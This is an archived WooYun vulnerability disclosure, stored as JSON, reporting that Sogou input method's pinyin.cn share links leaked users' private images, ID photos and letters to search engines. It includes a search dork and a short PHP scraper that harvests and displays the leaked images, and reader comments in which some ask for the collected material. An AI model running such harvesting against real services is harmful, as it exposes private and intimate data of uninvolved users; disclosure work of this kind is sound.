{"id": 12447, "wybug_id": "wooyun-2013-023081", "wybug_title": "搜狗输入法可导致大量用户敏感信息泄露", "wybug_corp": "搜狗", "wybug_author": "镇长", "wybug_date": "2013-05-04 18:21", "wybug_open_date": "2013-06-05 16:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-05：\t细节向公众公开  简要描述： 搜狗输入法信息发送过程存储了相对应的信息在云端，但由于相应配置及其他原因造成会话信息【图片、视频、音频】泄露。其中很多身份证、果照、还有检举信！！！ 详细说明：  搜狗输入法信息发送过程存储了相对应的信息，由于不严谨造成信息被搜索引擎抓取。Google或者bing：           输入关键词：site:pinyin.cn           [bing=3,700 条结果],[Google=约 1,120 条结果 ]\n\n\n\n\n\n\n\n   漏洞证明：  为了验证方便，写了一段代码这个是针对bing的结果弄的。直接这种形式去查看吧，挺方便还支持翻页哦亲！\n<?phpset_time_limit(0);$url = 'http://cn.bing.com/search?q=site%3apinyin.cn&qs=n&pq=site%3apinyin.cn&sc=0-4&sp=-1&sk=&first={ddddd}1&FORM=PERE';$i = $_GET['i'];\t$api = file_get_contents(str_replace('{ddddd}',$i,$url));\tpreg_match_all('/<a href=\\\"http:\\/\\/pinyin.cn\\/([a-zA-Z0-9]+)?\\\"/',$api,$a);\tforeach($a[1] as $v) {\t\t$api = file_get_contents('http://pinyin.cn/'.$v);\t\tpreg_match('/<a target=\"_blank\" href=\"(.*?)\">/',$api,$aa);\t\tif($aa) {\t\t\techo '<br>';\t\t\techo '<a target=\"_blank\" href=\"http://pinyin.cn/'.$v.'\">http://pinyin.cn/'.$v.'</a>:';\t\t\techo '<img class=\\'round_img\\' id=\\'round_img\\' src=\"'.$aa[1].'\" border=0 max-width=\"210px\" max-height=\"210px\" />';\t\t}}\n   修复方案：  短信发送时可以带一组查看码(如4位字符)，打开链接时输入查看码才能查看内容。   版权声明：转载请注明来源 镇长@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-05-05 12:20 厂商回复： 收到，感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-04 18:33 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:68        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  都泄漏啥了？艳照门？    \n     2013-05-04 18:49 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  楼主准备跑路吧,11年搜狗输入法就带后门了，有类似功能的软件还有好几款    \n     2013-05-04 18:52 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  哈哈。。黑阔们,你们一直都在天朝的监控之下。    \n     2013-05-04 18:53 |    \t\t镇长 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云小镇，镇长！)\t\t \n  @liner 真的假的？没事的，我们镇上我最大，谁来杀谁啊！    \n     2013-05-04 18:56 |    \t\t镇长 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云小镇，镇长！)\t\t \n  @QQ852451559 我不是黑客啊，不说了。我下地干活去了，地里的农药还没打完呢，来发个漏洞就走了。    \n     2013-05-04 19:50 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  楼主自求多福吧，这个功能是跟衙门合作的，不信去zone搜一下    \n     2013-05-04 21:31 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  @镇长 准备跑吧....他们为了这个可是花了力气的...    \n     2013-05-04 21:46 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:76        | coder)\t\t \n    面对地对地导弹的精准打击，在田地里伪装成辛勤劳作的农民是没有用的！    \n     2013-05-04 22:35 |    \t\t镇长 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云小镇，镇长！)\t\t \n  @shine 不要吓唬我啊，我第一次提交漏洞啊。还年轻，前辈们别吓唬我啊！    \n     2013-05-05 10:20 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:165        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @镇长 现在打农药都是晚上进行的吗,交流下，我最近也搞科学种田:)    \n     2013-05-05 10:27 |    \t\t镇长 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云小镇，镇长！)\t\t \n  @专业种田 给害虫吃的，下午正好他们需要进食。    \n     2013-05-05 12:32 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  @镇长 你这搞的人BJ G ||A 又得重新请主管吃饭,程序又得重新设计后门了     \n     2013-05-05 14:26 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  @镇长，目测今晚会有人去你家借拖拉机    \n     2013-06-05 16:16 |    \t\tliyang \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 低调 沉默 守望)\t\t \n  要火了~现在竟然还能搜到~    \n     2013-06-05 16:28 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  我靠，官方一个多月了居然还没修！    \n     2013-06-05 16:38 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  @疯狗 从底层就没考虑，估计不好修了    \n     2013-06-05 16:48 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @呆子不开口 目前搜狗自残中。。    \n     2013-06-05 16:48 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  都没有节操    \n     2013-06-05 16:49 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  搜不到了..robot处理了    \n     2013-06-05 16:49 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  @疯狗 不可能删除，可能是换地址了，可以抓包再看看    \n     2013-06-05 17:15 |    \t\tx-star \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:13        | Windows/Linux Kernel.  Information Secur...)\t\t \n  已经看不了了      \n     2013-06-05 17:18 |    \t\trhfs \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | rhfs.cc)\t\t \n  已经搜不到了。来晚了。    \n     2013-06-05 17:58 |    \t\txiaogui \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:15        | 围观大牛来了~~~)\t\t \n  来晚了，后悔啊~~~    \n     2013-06-05 19:39 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  来晚了，后悔啊~~~~~    \n     2013-06-05 19:53 |    \t\tayys \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 欢迎交流，熟悉正方教务系统漏洞。专业挖洞...)\t\t \n  来晚了。。。。啊。。。。。。    \n     2013-06-05 19:58 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:189        | 逆流而上)\t\t \n  擦，又晚了    \n     2013-06-05 20:02 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  哥们自己没少看吧？    \n     2013-06-05 20:56 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  来晚了呀来晚了    \n     2013-06-05 23:46 |    \t\tx0ers \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:4        | 专注计算机：开机关机重启20年。)\t\t \n  啊啊啊啊啊啊,来晚了，楼主把你打包的发出来吧，好人一身平安，你懂的！    \n     2013-06-05 23:55 |    \t\t镇长 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云小镇，镇长！)\t\t \n  @p0di 哎，我一个种地的，为什么发个漏洞会引起如此大的效果。弄得我到现在还不敢睡觉，明天一早还要下地干活啊。    \n     2013-06-05 23:55 |    \t\t镇长 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云小镇，镇长！)\t\t \n  @x0ers 我一个种地的留这些干啥啊。    \n     2013-06-06 13:09 |    \t\t小土豆 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:22        )\t\t \n  小屌丝 膜拜神牛。    \n     2013-06-06 14:34 |    \t\t唐纳德 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 网站站长)\t\t \n  其他的搜索引擎可以搜到结果,但是提示文件已过期,和谐掉了吧    \n     2013-06-06 20:00 |    \t\t黄色沙漠 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        )\t\t \n  谷歌hack哈    \n     2013-11-08 11:21 |    \t\tkid23 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 1+1=10)\t\t \n  @镇长 噗，是你挑的图片太劲爆    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}